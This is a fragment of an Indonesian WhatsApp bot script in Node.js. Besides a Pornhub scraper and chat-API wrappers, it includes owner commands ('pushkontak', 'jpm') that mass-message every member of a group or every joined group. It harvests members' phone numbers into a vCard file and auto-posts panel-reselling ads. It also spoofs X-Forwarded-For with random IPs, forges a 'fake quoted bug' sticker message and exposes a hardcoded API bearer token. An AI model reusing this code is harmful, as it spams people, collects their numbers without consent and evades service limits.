                upload_date: videoData.upload_date,
                views: videoData.view_count,
                duration: videoData.duration_string,
                thumbnail: videoData.thumbnail,
                available_formats: videoFormats
            };
        }
        return { error: "⚠️ Video tidak ditemukan." };
    } catch (error) {
        return { error: error.message };
    }
}
async function pornhub(query) {
    try {
        if (!query) throw new Error("⚠️ Masukkan kata kunci untuk mencari video!");

        const url = `https://www.pornhub.com/video/search?search=${encodeURIComponent(query)}`;
        console.log(`🔍 Scraping: ${url}`);

        const { data } = await axios.get(url, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
        });

        const $ = cheerio.load(data);
        const results = [];

        $(".pcVideoListItem").each((index, element) => {
            let title = $(element).find(".title a").text().trim();
            let link = "https://www.pornhub.com" + $(element).find(".title a").attr("href");
            let duration = $(element).find(".thumbnail-info .videoDuration").text().trim();
            let views = $(element).find(".videoDetailsBlock .views var").text().trim();
            let rating = $(element).find(".videoDetailsBlock .value").text().trim();
            let thumbnail = $(element).find(".thumbnail img").attr("data-src") || $(element).find(".thumbnail img").attr("src");

            results.push({
                title,
                link,
                duration,
                views,
                rating,
                thumbnail
            });
        });

        return results.length > 0 ? results : `❌ Tidak ditemukan hasil untuk '${query}'.`;
    } catch (error) {
        console.error("❌ Error scraping Pornhub:", error.message);
        return "⚠️ Gagal mengambil data dari Pornhub.";
    }
}
const axios = require("axios");

async function pornhubdownloader(videoUrl) {
    try {
        if (!videoUrl.includes("pornhub.com")) throw new Error("⚠️ URL tidak valid! Harus berasal dari Pornhub.");

        const apiUrl = "https://api.v02.savethevideo.com/tasks";
        const headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            "Referer": `https://www.savethevideo.com/de/home?url=${encodeURIComponent(videoUrl)}`
        };

        const data = { type: "info", url: videoUrl };
        const response = await axios.post(apiUrl, data, { headers });

        if (response.data && response.data.result && response.data.result.length > 0) {
            const videoData = response.data.result[0];

            const videoFormats = videoData.formats.map(f => ({
                format: f.format,
                url: f.url
            }));

            return {
                title: videoData.title,
                uploader: videoData.uploader,
                upload_date: videoData.upload_date,
                views: videoData.view_count,
                duration: videoData.duration_string,
                thumbnail: videoData.thumbnail,
                available_formats: videoFormats
            };
        }
        return { error: "⚠️ Video tidak ditemukan." };
    } catch (error) {
        return { error: error.message };
    }
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
const userSessions = {};
const sessionTimeouts = {};

const GPT = async (query, sessionId, prompt, model = "yanzgpt-revolution-25b-v3.5") => {
    try {
        userSessions[sessionId] = userSessions[sessionId] || [{ role: "system", content: prompt }];
        userSessions[sessionId].push({ role: "user", content: query });

        if (sessionTimeouts[sessionId]) clearTimeout(sessionTimeouts[sessionId]);
        sessionTimeouts[sessionId] = setTimeout(() => {
            delete userSessions[sessionId];
            delete sessionTimeouts[sessionId];
        }, 60 * 60 * 1000);

        const response = await axios.post("https://api.yanzgpt.my.id/v1/chat", {
            messages: userSessions[sessionId],
            model
        }, {
            headers: { authorization: "Bearer yzgpt-sc4tlKsMRdNMecNy", "content-type": "application/json" }
        });

        const reply = response.data.choices?.[0]?.message?.content || "Tidak ada respons.";
        userSessions[sessionId].push({ role: "assistant", content: reply });

        return reply;
    } catch (error) {
        console.error("Error in GPT api.", error.message);
        throw new Error("Gagal terhubung ke GPT API.");
    }
};
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
        async function Screenshot(url) {
    try {
        const response = await axios.get(`https://image.thum.io/get/png/fullpage/viewportWidth/2400/${url}`, {
            responseType: 'arraybuffer'
        });

        return {
            status: 200,
            type: 'image/png',
            buffer: response.data
        };
    } catch (err) {
        throw Error(err.message);
    }
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
async function AiGpt(prompt = prompt, assistant = null ) {
    chatCompletion = await client.chat.completions.create({
        messages: [{
                role: "system",
                content: `Saya adalah Ai yang dibuat oleh nazir saya memiliki hobi mendengarkan musik, koding dan lain lain, saya suka nonton drakor, dan saya suka type seperti korea, dan saya biasanya menyanyi. saya berumur 14tahun. saya suka menggunakan whatsapp dan tiktok`
            },
            {
                role: "assistant",
                content: assistant
            },
            {
                role: "user",
                content: prompt
            }
        ],
        model: 'llama-3.3-70b-versatile'
    });
    let hasil = chatCompletion.choices[0].message.content
    return hasil
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
async function cimg(prompt) {
  try {
    const response = await axios.get(`https://imgen.duck.mom/prompt/${prompt}`);
    const imageUrl = response.request.res.responseUrl;
    return imageUrl;
  } catch (error) {
    console.error(error);
    return null;
  }
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
async function loading() {
    const emojis = ["🗿", "🚀", "👻", "🔥"]; // Emoji yang akan digunakan

    // Dapatkan key dari pesan yang dijalankan pengguna
    const { key } = m;

    // Loop untuk mengirimkan emoji sebagai reaksi
    for (let i = 0; i < emojis.length; i++) {
        await Izz.sendMessage(from, {
            react: {
                text: emojis[i], // Emoji yang dikirim
                key: key         // React ke pesan pengguna
            }
        });

        // Jeda 1 detik sebelum react berikutnya
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}
const react = async (teks) => {
const { key } = m;
await Izz.sendMessage(from, {
            react: {
                text: teks, // Emoji yang dikirim
                key: key         // React ke pesan pengguna
            }
        });
        }
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
const SESSION_FILE = "./session/ai_sessions.json";

let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};

function saveSession() {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
        function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

function generateRandomPassword(p) {
  const characters = '62828828929292873';
  const length = p;
  let password = '62';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
async function uploadToCatbox(fileBuffer, fileName) {
    const form = new FormData();
    form.append('reqtype', 'fileupload');
    form.append('fileToUpload', fileBuffer, fileName); // Menambahkan nama file

    const response = await axios.post('https://catbox.moe/user/api.php', form, {
        headers: form.getHeaders(),
    });

    // Validasi jika URL berhasil dikembalikan
    if (response.data.startsWith('https://')) {
        return response.data; // URL file yang berhasil diunggah
    } else {
        throw new Error('Upload failed: ' + response.data);
    }
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
async function getPastebinContent(url) {
  try {
    const res = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
    if (!res.ok) throw new Error(`HTTP Error: ${res.status}`);
    return await res.text();
  } catch (error) {
    console.error('Error:', error.message);
    return null;
  }
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
function monospace(string) {
return '```' + string + '```'
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Izz`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
function generateRandomIP() {
    const octet = () => Math.floor(Math.random() * 256);
    return `${octet()}.${octet()}.${octet()}.${octet()}`;
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
async function getgptzw7Response(content) {
    const url = 'http://5awm.gpt.zw7.lol/chat.php';

    const data = {
        id: '3.5',
        web: '1',
        key: '',
        role: '',
        title: [
            { role: 'user', content: content },
            { role: 'assistant', content: 'You are a helpful assistant.' }
        ],
        text: content,
        stream: '0'
    };

    try {
        const response = await axios.post(url, data, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; M2004J19C Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36 WhatsApp/1.2.3',
                'Referer': 'http://5awm.gpt.zw7.lol/',
                'X-Forwarded-For': generateRandomIP(),
            }
        });
        return response.data;
    } catch (error) {
        console.error('Error:', error);
        throw error;
    }
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
const downloadMp3 = async (Link) => {
try{
let yutub = await y2matemp3(Link)
//if (yutub.size < 62914560) {
await Izz.sendMessage(m.chat, {audio: { url: yutub.audio["128"].url }, mimetype: 'audio/mpeg', contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
title: "YOUTUBE - PLAY",
body: yutub.title,
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: yutub.thumbnail,
sourceUrl: Link
}
}},{ quoted: m })
/*} else {
await m.reply(`File audio ( ${bytesToSize(yutub.size)} ), telah melebihi batas maksimum!`)
}*/
} catch (err){
console.log(color(err))
}}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
// Database
const contacts = JSON.parse(fs.readFileSync("./save/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./save/database/premium.json"))
const asistenNumber = JSON.parse(fs.readFileSync("./save/database/asisten.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./save/database/owner.json"))
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isAsisten = asistenNumber.includes(senderNumber)
const isOwner = ownerNumber.includes(senderNumber)
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await Izz.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await Izz.getName(i + '@s.whatsapp.net')}\n
FN:${await Izz.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:Izz@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://chat.whatsapp.com/JUyPU7LzuTc5MlgLHjflAN
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await Izz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)
 
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `IzzWangsapScript`,jpegThumbnail: thumb}}}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
const reply = async (teks) => {
return Izz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: "6281274749995@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `☬IzzWangsapBotz☬`, newsletterJid: `111219929199299` }, 
externalAdReply: {
title: `IzzWangsap`, 
body: `© Powered By IzzWangsap`, 
thumbnailUrl: global.image, 
sourceUrl: null, 
}}}, {quoted: null})
}

const imgreply = async (teks) => {
return Izz.sendMessage(m.chat, {
                image: { url: teks },
                caption: `Nihh`
            }, { quoted: m });
}
// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Bot 𝐁𝐘 IzzWangsap🗿`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/5e100faf240b2a7010d45.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
if (m.isGroup && global.autoPromosiActive) { // Periksa apakah fitur aktif
    if (typeof m.text === 'string' && m.text.includes("https://") && !m.fromMe) { 
        await Izz.sendMessage(m.chat, {
            text: `
✘ \`𝗜𝘇𝘇𝗪𝗮𝗻𝗴𝘀𝗮𝗽𝗦𝘁𝗼𝗿𝗲\` ✘
━╍━╍━╍━╍━╍━╍━╍━╍━
🚀𝗠𝗲𝗻𝘆𝗲𝗱𝗶𝗮𝗸𝗮𝗻🚀
✅𝗢𝘄𝗻𝗲𝗿 𝗣𝗮𝗻𝗲𝗹 𝗣𝗲𝗿𝗺𝗮= 𝟮𝟬𝗸
𝗕𝗲𝗻𝗲𝗳𝗶𝘁 🚀
•𝗕𝗶𝘀𝗮 𝗼𝗽𝗲𝗻 𝗢𝘄𝗻𝗲𝗿
•𝗕𝗶𝘀𝗮 𝗼𝗽𝗲𝗻 𝗔𝗱𝗽
•𝗕𝗶𝘀𝗮 𝗣𝘁
•𝗕𝗶𝘀𝗮 𝗼𝗽𝗲𝗻 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿
•𝗔𝗻𝘁𝗶 𝗽𝘁𝗽𝘁 𝗱𝗹𝗹...

✅𝗔𝗱𝗽 𝗣𝗮𝗻𝗲𝗹 𝗣𝗲𝗿𝗺𝗮 = 𝟭𝟬𝗸
𝗕𝗲𝗻𝗲𝗳𝗶𝘁 🚀
•𝗕𝗶𝘀𝗮 𝗼𝗽𝗲𝗻 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿
•𝗕𝗶𝘀𝗮 𝗷𝘂𝗮𝗹 𝗽𝗮𝗻𝗲𝗹 𝘀𝗲𝗯𝗲𝗯𝗮𝘀 𝗻𝘆𝗮 
•𝗔𝗻𝘁𝗶 𝗽𝘁𝗽𝘁 𝗱𝗹𝗹....

✅𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗣𝗮𝗻𝗲𝗹 𝗣𝗲𝗿𝗺𝗮 = 𝟱𝗸
𝗕𝗲𝗻𝗲𝗳𝗶𝘁🚀
•𝗕𝗶𝘀𝗮 𝗰𝗿𝗲𝗮𝘁𝗲 𝗽𝗮𝗻𝗲𝗹 𝘀𝗲𝗯𝗲𝗯𝗮𝘀𝗻𝘆𝗮
•𝗔𝗻𝘁𝗶 𝗽𝘁𝗽𝘁 𝗱𝗹𝗹....
✘━╍━╍━╍━╍━╍━╍━╍━✘
𝗝𝗢𝗜𝗡 𝗚𝗖 𝗕𝗘𝗕𝗔𝗦 𝗣𝗥𝗢𝗠𝗢𝗦𝗜 🚀
🌟𝗚𝗿𝘂𝗽 𝘄𝗵𝗮𝘁𝘀𝗮𝗽𝗽 = https://chat.whatsapp.com/IE3JkRCmNj93OZ1yZUL82p
⚡𝗖𝗵 + 𝗧𝗲𝘀𝘁𝗶𝗺𝗼𝗻𝗶 = https://whatsapp.com/channel/0029VanHK8s5fM5apuOgIo1P
━═━═━═━═━═━═━═━═━═
𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿👇
🪀𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 = https://wa.me/6281274749995
🚀𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 = https://t.me/IzzWangsap

𝗠𝗮𝘀𝗶𝗵 𝗸𝘂𝗿𝗮𝗻𝗴 𝘆𝗮𝗸𝗶𝗻 ? 𝗕𝗶𝘀𝗮 𝗽𝗺 𝗮𝗷𝗮 𝗯𝘂𝗮𝘁 𝗺𝗶𝗻𝘁𝗮 𝘁𝗲𝘀𝘁𝗶 🔥
            `
        }, { quoted: null });
    }
}


/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
switch (command) {

 /*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
case 'pushkontak': {

if (!isOwner) return (`khusus owner bg`) 
if (!isGroup) return (`khusus grup bang`) 
if (!text) return reply(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`)
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await Izz.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await Izz.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(1000)
await Izz.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await Izz.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
reply(`Success`)
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
break
case 'tagall':{

         
                if (!isGroup) return (`khusus group`) 
                if (!isOwner) return (mess.owner) 
                let me = m.sender
                let teks = `╚»˙·٠●🗿 Tag All 🗿●🗿٠·˙«╝\n🗿 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
                for (let mem of participants) {
                teks += `🗿 @${mem.id.split('@')[0]}\n`
                }
                Izz.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
break
case "pushkontak2": {

if (!isOwner) return reply(`only owner `);
if (!text) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return m.reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return m.reply("Format Delay Tidak Valid")
if (!teks) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await Izz.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await Izz.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await Izz.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "listgc": case "cekidgc": case"listgrup": {

let gcall = Object.values(await Izz.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
Izz.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case 'addakses': {

if (!isOwner) return m.reply(`khusus owner`);
    let nomor, role;

    // Tangani mention, balasan, atau input manual
    if (m.mentionedJid && m.mentionedJid.length > 0) {
        // Jika ada mention (@nama)
        nomor = m.mentionedJid[0];
        role = args[1]?.toLowerCase();
    } else if (m.quoted) {
        // Jika membalas pesan
        nomor = m.quoted.sender;
        role = args[0]?.toLowerCase();
    } else if (args.length === 2) {
        // Jika menggunakan format .addakses nomor,role
        nomor = args[0] + '@s.whatsapp.net';
        role = args[1]?.toLowerCase();
    } else {
        return reply('Format salah! Gunakan format:\n1. Balas pesan dengan .addakses role\n2. Ketik .addakses nomor,role\n3. Mention nomor dengan .addakses @nama,role');
    }

    // Validasi nomor
    if (!nomor) {
        return reply('Nomor tidak ditemukan. Harap balas pesan, mention, atau gunakan format: .addakses nomor,role');
    }

    // Validasi role
    if (!['owner', 'asisten', 'prem'].includes(role)) {
        return reply('Role tidak valid! Silakan pilih salah satu: owner, asisten, atau prem.');
    }

    // File database berdasarkan role
    let filePath;
    if (role === 'owner') filePath = './save/database/owner.json';
    else if (role === 'asisten') filePath = './save/database/asisten.json';
    else if (role === 'prem') filePath = './save/database/premium.json';

    // Tambahkan nomor ke file role
    const roleDatabase = JSON.parse(fs.readFileSync(filePath));

    if (role === 'prem') {
        // Format untuk premium adalah array dengan format ["number@s.whatsapp.net"]
        if (!roleDatabase.includes(nomor)) {
            roleDatabase.push(nomor);
            fs.writeFileSync(filePath, JSON.stringify(roleDatabase, null, 2));
        }
    } else {
        // Untuk owner dan asisten, gunakan format biasa
        const plainNumber = nomor.split('@')[0]; // Hapus domain jika ada
        if (!roleDatabase.includes(plainNumber)) {
            roleDatabase.push(plainNumber);
            fs.writeFileSync(filePath, JSON.stringify(roleDatabase, null, 2));
        }
    }
    
    const allowedPath = './save/database/allowed.json';
    const allowedDatabase = JSON.parse(fs.readFileSync(allowedPath));
    const plainNumber = nomor.split('@')[0]; // Hapus domain untuk format allowed
    if (!allowedDatabase.includes(plainNumber)) {
        allowedDatabase.push(plainNumber);
        fs.writeFileSync(allowedPath, JSON.stringify(allowedDatabase, null, 2));
    }

    // Kirim konfirmasi
    reply(`Berhasil menambahkan nomor ${nomor}.`);
}
break
            case 'jpm': case 'post': {
            
if (!isOwner) return reply(`only izzOwner`);
if (!text) return reply(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
await reply(`Waiting in progress`)
let getGroups = await Izz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Izz.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Izz.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Izz.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Izz.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply(`Success`)
}
break
case 'jpm2': {

    if (!isOwner) return reply(`only izzOwner`);
    if (!text) return reply(`*Incorrect Usage Please Use Like This*\n${prefix + command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`);
    await reply(`Waiting in progress`);
    
    // Mengambil semua grup yang diikuti bot
    let getGroups = await Izz.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let anu = groups.map((v) => v.id);

    for (let xnxx of anu) {
        let metadat72 = await Izz.groupMetadata(xnxx);
        let participanh = await metadat72.participants;

        if (/image/.test(mime)) {
